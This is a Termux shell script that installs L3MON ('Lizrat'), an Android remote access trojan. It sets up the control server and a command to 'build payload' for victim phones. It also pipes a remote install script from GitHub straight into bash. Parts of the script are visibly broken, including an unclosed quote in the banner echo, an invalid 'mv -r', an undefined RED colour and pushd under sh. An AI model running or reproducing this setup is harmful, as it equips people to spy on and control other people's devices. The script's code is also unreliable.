#!/usr/bin/env sh

# ASCII color codes
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
SAF='\033[38;5;202m'
WHITE='\033[37m'
NC='\033[0m' # No color


echo "	██╗░░░░░██████╗░███╗░░░███╗░█████╗░███╗░░██╗  ██████╗░░░░░█████╗░
	██║░░░░░╚════██╗████╗░████║██╔══██╗████╗░██║  ╚════██╗░░░██╔══██╗
	██║░░░░░░█████╔╝██╔████╔██║██║░░██║██╔██╗██║  ░░███╔═╝░░░██║░░██║
	██║░░░░░░╚═══██╗██║╚██╔╝██║██║░░██║██║╚████║  ██╔══╝░░░░░██║░░██║
	███████╗██████╔╝██║░╚═╝░██║╚█████╔╝██║░╚███║  ███████╗██╗╚█████╔╝
	╚══════╝╚═════╝░╚═╝░░░░░╚═╝░╚════╝░╚═╝░░╚══╝  ╚══════╝╚═╝░╚════╝░

echo "${YELLOW}Updating system, PRESS 'Y' When ASKED${NC}"
pkg update && pkg upgrade

if [ -d "$PREFIX/opt" ]; then
  echo "${GREEN}Directory already exists${NC}"
else
  echo "${BLUE}Creating /usr/opt Directory${NC}"
  mkdir "$PREFIX/opt"
  echo "${GREEN}Directory created${NC}"
fi

echo "${YELLOW}Moving l3mon directory to /usr/opt${NC}"
mv -r l3mon "$PREFIX/opt"
echo "${GREEN}l3mon directory Moved${NC}"

echo "${YELLOW}Checking if java, nodejs & npm is installed or not${NC}"
if ! command -v java >/dev/null 2>&1 || ! command -v node >/dev/null 2>&1 || ! command -v npm >/dev/null 2>&1; then
  echo "${CYAN}Packages not found, Installing them${NC}"
  pkg install -y openjdk-17 nodejs
else
  echo "${CYAN}Packages Found, Removing them${NC}"
  pkg remove -y openjdk-17 nodejs
  echo "${CYAN}Installing packages${NC}"
  pkg install -y openjdk-17 nodejs
fi

echo "${YELLOW}Installing pm2${NC}"
npm install pm2 -g


echo "${YELLOW}Installing apktool, zipalign & apksigner${NC}"
pkg install -y apksigner 
curl -s https://raw.githubusercontent.com/rendiix/rendiix.github.io/master/install-repo.sh | bash
apt update
pkg install -y apktool zipalign

echo "${YELLOW}Installing Lizrat${NC}"
pushd "$PREFIX/opt/l3mon" && npm install && popd

echo "pushd $PREFIX/opt/l3mon && pm2 start index.js && popd" > "$PREFIX/bin/l3mon"
echo "pushd $PREFIX/opt/l3mon && pm2 stop index.js && popd" > "$PREFIX/bin/l3monx"
echo "pushd $PREFIX/opt/l3mon && ./builder.sh && popd" > "$PREFIX/bin/l3monb"

chmod +x "$PREFIX/bin/l3mon" "$PREFIX/bin/l3monx" "$PREFIX/bin/l3monb"

echo "${GREEN}Installation complete${NC}, ${SAF}Run l3mon by executing l3mon${NC}"
echo "${CYAN}To build payload execute l3monb${NC}"
echo "${RED}To stop the Lizrat server execute l3monx${NC}"
